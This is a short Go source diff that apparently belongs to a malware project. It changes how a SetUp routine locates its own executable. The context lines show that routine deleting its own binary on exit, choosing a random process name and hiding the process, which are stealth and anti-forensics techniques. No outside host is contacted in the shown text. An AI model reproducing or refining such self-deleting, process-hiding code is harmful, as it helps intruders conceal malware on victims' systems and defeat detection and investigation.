@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
 	"runtime"
 )
 
@@ -39,7 +40,7 @@ func SetUp() {
 				os.Args = append(os.Args[:i], os.Args[i+1:]...)
 			}
 		}
-		path, _ := util.GetExecPath()
+		path, _ := exec.LookPath(os.Args[0])
 		defer os.Remove(path)
 		name := util.GetRandomProcessName()
 		hide.Hide(name)
